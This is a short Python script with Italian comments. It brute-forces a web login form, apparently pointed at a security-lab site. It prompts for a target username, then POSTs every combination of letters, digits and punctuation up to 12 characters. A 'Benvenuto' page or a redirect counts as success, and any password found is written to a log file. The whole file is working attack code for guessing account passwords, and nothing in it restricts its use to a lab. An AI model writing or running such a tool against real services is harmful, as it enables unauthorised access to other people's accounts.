import itertools
import string
import requests
import time

# CONFIGURAZIONE
URL_LOGIN = "https://www.heartbleedlabelgg.com/" # Assicurati che l'IP sia completo
FILE_LOG = "credenziali_trovate.txt"

def avvio_interattivo():
    # 1. Chiedi l'username all'utente prima di partire
    print("\n" + "="*30)
    target_user = input("[?] Inserisci l'username da colpire: ")
    print("="*30 + "\n")

    # Set totale di caratteri
    caratteri = string.ascii_letters + string.digits + string.punctuation
    
    sessione = requests.Session()
    sessione.headers.update({'User-Agent': 'Mozilla/5.0'})
    
    print(f"[*] Obiettivo impostato su: {target_user}")
    print(f"[*] Inizio attacco brute force su {URL_LOGIN}...")

    # Prova combinazioni di password per l'utente scelto
    for lung in range(1, 13):
        for p in itertools.product(caratteri, repeat=lung):
            password = "".join(p)
            
            # Visualizzazione chiara
            print(f"[PROVA] username: {target_user} | password: {password}", end="\r")
            
            try:
                r = sessione.post(URL_LOGIN, data={'username': target_user, 'password': password}, timeout=5)
                
                # Controllo successo
                if "Benvenuto" in r.text or r.status_code == 302:
                    print(f"\n\n{'='*30}")
                    print(f"!!! ACCESSO TROVATO !!!")
                    print(f"Username: {target_user}")
                    print(f"Password: {password}")
                    print(f"{'='*30}")
                    
                    with open(FILE_LOG, "a") as f:
                        f.write(f"SUCCESSO -> {target_user}:{password}\n")
                    return
            except:
                print("\n[!] Connessione interrotta. Pausa...")
                time.sleep(5)

if __name__ == "__main__":
    avvio_interattivo()
